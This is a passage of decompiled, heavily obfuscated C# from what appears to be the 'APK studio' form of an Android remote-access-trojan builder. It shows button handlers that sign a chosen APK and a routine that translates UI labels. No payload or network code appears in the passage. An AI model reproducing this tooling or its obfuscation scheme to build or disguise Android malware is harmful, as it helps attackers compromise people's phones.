            num1 = (int) num2 * 280096608 ^ -304765614;
            continue;
          case 7:
            ((Auto_Clicker) TargetObject2).\u0024VB\u0024NonLocal_\u0024VB\u0024Closure_2 = TargetObject1;
            num1 = (int) num2 * -868664343 ^ 1622144572;
            continue;
          case 8:
            goto label_1;
          case 9:
            goto label_3;
          case 10:
            fileName = ((Auto_Clicker) ((Auto_Clicker) TargetObject2).\u0024VB\u0024NonLocal_\u0024VB\u0024Closure_2).\u0024VB\u0024Local_saveDialog.FileName;
            num1 = (int) num2 * -922091765 ^ 121511250;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Apk_studio._Closure\u0024__125\u002D0 TargetObject1 = (Apk_studio._Closure\u0024__125\u002D0) new Apk_studio._Closure\u0024__124\u002D1();
label_1:
      int num1 = 2105049226;
      while (true)
      {
        int num2 = num1;
        uint num3;
        // ISSUE: variable of a compiler-generated type
        Apk_studio._Closure\u0024__125\u002D1 TargetObject2;
        switch ((num3 = (uint) ((-521116716 - --1959575617 - ~(num2 ^ (-(--681433416 - ~-1277060999) ^ 1695545021 ^ 191542551 ^ ~-285537281 ^ -1692791939 - 238205892 ^ -1554417463 * 1435275913) * 89817823)) * -1491648241)) % 14U)
        {
          case 0:
            ((Auto_Clicker) TargetObject2).\u0024VB\u0024NonLocal_\u0024VB\u0024Closure_2 = TargetObject1;
            ((Auto_Clicker) TargetObject2).\u0024VB\u0024Local_fileName = ((Auto_Clicker) ((Auto_Clicker) TargetObject2).\u0024VB\u0024NonLocal_\u0024VB\u0024Closure_2).\u0024VB\u0024Local_saveDialog.FileName;
            // ISSUE: reference to a compiler-generated field
            Codes.ExecuteSign(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH, ((Auto_Clicker) TargetObject2).\u0024VB\u0024Local_fileName);
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject2, __methodptr(_Lambda\u0024__1)));
            num1 = (int) num3 * 1692396154 ^ -1262035713;
            continue;
          case 1:
            CraxsAlert.Showinformation(EXGuarder.\u00330502B42);
            num1 = (int) num3 * -2044277660 ^ -440757415;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            int num4 = !string.IsNullOrEmpty(((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH) ? 1470106036 : (num4 = 1596348599);
            num1 = num4 ^ (int) num3 * -1274972694;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_saveDialog.FileName = ((Apk_studio._Closure\u0024__124\u002D1) this).TargetAPKNAME + EXGuarder.\u0034B172D17;
            num1 = (int) num3 * 919247958 ^ -838910211;
            continue;
          case 4:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) TargetObject1, __methodptr(_Lambda\u0024__0)));
            num1 = (int) num3 * -1941445040 ^ -419368784;
            continue;
          case 5:
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_saveDialog.Filter = EXGuarder.\u0031B5C1076;
            num1 = (int) num3 * -614376281 ^ -533400239;
            continue;
          case 6:
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Me = this;
            num1 = (int) num3 * -1866788291 ^ -2094604966;
            continue;
          case 7:
            num1 = (int) num3 * -1123745094 ^ 994103945;
            continue;
          case 8:
            int num5 = ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_dialogResult != DialogResult.OK ? 1757011935 : (num5 = -1130157337);
            num1 = num5 ^ (int) num3 * 326585333;
            continue;
          case 9:
            goto label_1;
          case 10:
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_saveDialog.RestoreDirectory = true;
            num1 = (int) num3 * -1408661738 ^ -1637215534;
            continue;
          case 11:
            // ISSUE: object of a compiler-generated type is created
            TargetObject2 = (Apk_studio._Closure\u0024__125\u002D1) new Apk_studio._Closure\u0024__125\u002D0();
            num1 = (int) num3 * -828662962 ^ 1767097818;
            continue;
          case 12:
            ((Auto_Clicker) TargetObject1).\u0024VB\u0024Local_saveDialog = new SaveFileDialog();
            num1 = -1871452259;
            continue;
          case 13:
            goto label_3;
          default:
            goto label_16;
        }
      }
label_3:
      return;
label_16:;
    }

    private void TargetApktext_TextChanged(object sender, EventArgs e)
    {
    }

    private void Apk_studio_Load(object sender, EventArgs e) => this.Translateme();

    private void Translateme()
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u0030B0E742F, false) == 0)
        goto label_11;
label_1:
      int num1 = -1671743412;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-(~-466321820 * 444493195 + ~(~429246108 - (-1377068164 * -1355896431 ^ 263787813 * -708720709)) - num2 + 31106865 * ~~(1702494374 + 2005630247)) ^ -28588727 * (-729040013 * -2050058870)) - -1164869500 + 1413567018)) % 14U)
        {
          case 0:
            goto label_1;
          case 1:
            this.Label2.Text = EXGuarder.\u0033A250D71;
            num1 = (int) num3 * -1422661652 ^ -1907906208;
            continue;
          case 2:
            this.selectapkbtn.Text = EXGuarder.\u0033675761F;
            num1 = (int) num3 * -2016069471 ^ 423842998;
            continue;
          case 3:
            this.sinbtn.Text = EXGuarder.\u0033A6D3131;
            this.probtn.Text = EXGuarder.\u003183D2272;
            this.selectapkbtn.Text = EXGuarder.\u0032A075004;
            num1 = (int) num3 * -73284382 ^ 645016185;
            continue;
          case 4:
            this.probtn.Text = EXGuarder.\u00362270762;
            num1 = (int) num3 * 525535839 ^ 439932469;
            continue;
          case 5:
            int num4 = Operators.CompareString(language, EXGuarder.\u003510A2C29, false) != 0 ? 966834701 : (num4 = -1424162164);
            num1 = num4 ^ (int) num3 * 681857832;
            continue;
          case 6:
            this.sinbtn.Text = EXGuarder.\u00361611758;
            num1 = (int) num3 * -350666785 ^ -69028411;
            continue;
          case 7:
            this.savebtn.Text = EXGuarder.\u003742B6F5D;
            this.debtn.Text = EXGuarder.\u0033E105B0D;
            num1 = (int) num3 * -134588225 ^ 1689545942;
            continue;
          case 8:
            this.Label2.Text = EXGuarder.\u0037171650D;
            num1 = (int) num3 * 1426106026 ^ 1286743385;
            continue;
          case 9:
            goto label_11;
          case 10:
            goto label_3;
          case 11:
            this.debtn.Text = EXGuarder.\u00327102363;
            this.cobtn.Text = EXGuarder.\u0031B652724;
            num1 = (int) num3 * -963386510 ^ -1387299300;
            continue;
          case 12:
            this.cobtn.Text = EXGuarder.\u00342373751;
            num1 = (int) num3 * -640306990 ^ 53020947;
            continue;
          case 13:
            num1 = (int) num3 * 1547735785 ^ -405928606;
            continue;
          default:
            goto label_16;
        }
      }
label_3:
      return;
label_16:
      return;
label_11:
      this.savebtn.Text = EXGuarder.\u00356665C47;
      num1 = 1418532622;
      goto label_2;
    }

    public Apk_studio()
    {
    }

    [SpecialName]
    internal void _Lambda\u0024__0()
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      ((Apk_studio._Closure\u0024__125\u002D1) this).\u0024VB\u0024Me.logtext.AppendText("> " + ((Apk_studio._Closure\u0024__125\u002D1) this).\u0024VB\u0024Local_str + "\r\n-----------------------\r\n");
    }
  }
}
